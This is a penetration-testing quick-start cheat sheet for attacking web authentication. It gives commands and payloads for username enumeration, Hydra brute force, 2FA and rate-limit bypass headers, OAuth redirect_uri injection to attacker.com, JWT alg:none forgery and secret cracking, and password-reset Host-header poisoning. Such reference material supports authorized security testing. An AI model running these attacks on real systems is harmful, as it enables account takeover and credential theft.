# Authentication — Quick Start

Rapid testing methodology and quick-reference. Detailed scenarios in `INDEX.md` and `scenarios/`.

## Recon (2 min)

Identify auth endpoints: `/login`, `/signin`, `/auth`, `/authenticate`, `/oauth`, `/sso`, `/api/auth`. Check `/.well-known/openid-configuration` for OAuth discovery.

```bash
curl -X POST https://target/login -d "username=test&password=test" -v
```

Identify which method:
- Traditional form login.
- OAuth / SSO (look for redirects to identity provider).
- API key in header / query param.
- JWT bearer.
- MFA (look for second-factor flow).

## Username enumeration (3 min)

```bash
# Burp Intruder:
# 1. Capture POST /login → Send to Intruder.
# 2. Mark username as payload position.
# 3. Load SecLists usernames.
# 4. Sort by response length / status / time.
# 5. Diff = enumeration possible.
```

Test for:
- Different error messages (`Invalid username` vs `Incorrect password`).
- Response length differences.
- Timing differences (use long-password trick: `password = "a" * 100`).
- Account-lockout messages only on valid users.

## Password attacks (5 min)

```bash
# Quick wins:
# 1. Default credentials (admin:admin, admin:password).
# 2. Common passwords (Password1, Welcome2024, <Company>2024).
# 3. Rate-limit bypass via X-Forwarded-For header.

# Hydra basic:
hydra -L users.txt -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```

Detailed: `scenarios/password-attacks/online-brute-force.md`, `dictionary-attack.md`, `password-spraying.md`.

## 2FA bypass (5 min)

Test in this order:
1. **Direct endpoint access**: skip 2FA page, navigate to `/dashboard` after password (`scenarios/2fa/direct-endpoint-access.md`).
2. **Response manipulation**: flip `success: false` → `true` at proxy (`response-manipulation.md`).
3. **OTP parameter manipulation**: empty/null/array (`otp-parameter-manipulation.md`).
4. **Brute-force OTP**: 4-digit space = 10K (`brute-force-otp.md`).
5. **Code reuse**: replay valid OTP (`code-reuse.md`).

## OAuth quick checks

```bash
# 1. Check for missing state parameter
GET /auth?client_id=...&redirect_uri=...&response_type=code   # no &state=

# 2. redirect_uri attacker injection
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com@attacker.com

# 3. Implicit flow tokens in fragment
?response_type=token        # exposes tokens in URL

# 4. Discovery
curl /.well-known/openid-configuration
```

Detailed: `scenarios/oauth/`.

## JWT quick checks

```bash
# 1. Decode token
echo "<header>.<payload>.<sig>" | cut -d. -f2 | base64 -d | jq

# 2. Try alg:none
echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
echo -n '{"sub":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '='
# Combine: <h>.<p>.

# 3. Crack weak secret
hashcat -m 16500 jwt.txt jwt.secrets.list

# 4. Check JWKS exposure
curl https://target/.well-known/jwks.json
```

Detailed: `scenarios/jwt/`.

## Session attacks (5 min)

```bash
# 1. Decode session cookie
echo "<cookie>" | base64 -d

# 2. Modify cookie components (try /; user/admin; perms)
# 3. Test session fixation (set victim's session via XSS)
# 4. Test session timeout enforcement
# 5. Check Secure / HttpOnly / SameSite flags
```

## Password reset attacks (3 min)

```bash
# 1. Token predictability — generate multiple tokens, look for patterns
curl /reset_password -d "email=test@test.com" → captures token
# Generate 10, look for: time-based, sequential, low entropy

# 2. Host header poisoning
curl -H "Host: attacker.com" /reset_password -d "email=victim@target.com"
# Reset link goes to attacker.com → captures token

# 3. Token validation tests
curl /reset?token=             # empty
curl /reset?token=null
curl /reset?token[]=ABC        # array
```

## Common bypasses

### Rate limit bypass via headers

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
```

Each header = different rate-limit bucket. Rotate.

### Lockout bypass

```bash
# Some apps reset counter on successful login from same session
# Send 4 wrong → 1 right → 4 wrong (no lockout)
```

### Multi-credential per request (GraphQL / batch)

```graphql
{
  login1: login(username: "u1", password: "p1") { token }
  login2: login(username: "u2", password: "p2") { token }
  login3: login(username: "u3", password: "p3") { token }
}
```

One HTTP request → many auth attempts → bypasses per-request rate limit.

## Top wordlists

| Use | File |
|---|---|
| Generic passwords | `rockyou.txt` |
| Top common | `SecLists/Common-Credentials/10k-most-common.txt` |
| Best 110 | `SecLists/Common-Credentials/best110.txt` |
| Default creds | `SecLists/Default-Credentials/...` |
| Usernames | `SecLists/Usernames/Names/...` |
| JWT secrets | `jwt.secrets.list` |

## Tool quick reference

| Tool | Purpose |
|---|---|
| Burp Suite (Intruder) | Web auth fuzzing |
| Hydra | SSH/FTP/SMB/RDP brute force |
| CrackMapExec / NetExec | Bulk SMB/WinRM/MSSQL |
| jwt_tool | JWT manipulation |
| Hashcat / John | Offline hash cracking |
| Responder / Inveigh | NTLM hash capture |
| evil-winrm | WinRM PtH |
| impacket | NTLM PtH (psexec.py / wmiexec.py) |
| ffuf | Generic HTTP fuzzing |

## Decision tree

- **Login form** → `password-attacks/online-brute-force.md` (defaults, dict), `password-spraying.md` (if lockout), `scenarios/2fa/` (MFA), `oauth/` (SSO), `jwt/` (JWT).
- **API key / Bearer** → JWT inspection at jwt.io; `scenarios/jwt/<picked-by-alg>`.
- **Have hash** → `password-attacks/hash-cracking.md`, `encrypted-container-cracking.md`, `pass-the-hash.md`.
- **Foothold** → `credential-dumping.md`, `ssh-controlmaster-hijack.md`, `db-hash-lateral-movement.md`.

## Resources

- `INDEX.md`, `authentication-principles.md`, `authentication-cheat-sheet.md`.
- PortSwigger Web Security Academy: https://portswigger.net/web-security/authentication
